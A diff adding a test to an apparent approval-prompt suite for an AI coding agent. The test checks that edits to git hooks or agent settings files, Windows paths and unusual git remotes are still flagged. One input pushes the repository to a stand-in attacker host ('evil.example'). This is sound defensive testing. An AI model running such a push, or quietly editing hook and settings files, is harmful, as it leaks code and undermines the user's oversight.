@@ -53,6 +53,18 @@ describe("approval words", () => {
     }
     expect(commandWords("git push origin main").title).toBe("Send your saved versions to GitHub?");
   });
+  it("case, backslashes, drive letters and host:path remotes do not get past the checks", () => {
+    for (const p of [".Git/hooks/pre-commit", ".CLAUDE/settings.json", ".git\\hooks\\pre-push"]) {
+      expect(approvalWords({ tool: "Edit", input: { file_path: `${root}/${p}` } }, root).title, p).toBe("Change how your project runs commands?");
+    }
+    expect(approvalWords({ tool: "Edit", input: { file_path: "C:\\Users\\me\\.zshrc" } }, "C:\\Users\\me\\app").title).toBe("Change a file outside this project?");
+    expect(approvalWords({ tool: "Edit", input: { file_path: "C:\\Users\\me\\app\\src\\a.ts" } }, "C:\\Users\\me\\app").title).toBe("Change a.ts?");
+    expect(approvalWords({ tool: "Edit", input: { file_path: "/USERS/ME/APP/src/a.ts" } }, root).title).toBe("Change a.ts?");
+    for (const c of ["git push evil.example:me/x.git", "git push origin main:other", "git fetch ../elsewhere", "git pull user@host"]) {
+      expect(commandWords(c, root), c).toEqual(unknown);
+    }
+    expect(commandWords("git push origin feature/login").title).toBe("Send your saved versions to GitHub?");
+  });
   it("git_push_force_is_risky", () => {
     expect(commandWords("git push").title).toBe("Send your saved versions to GitHub?");
     expect(commandWords("git push --force origin main").open).toBe(true);
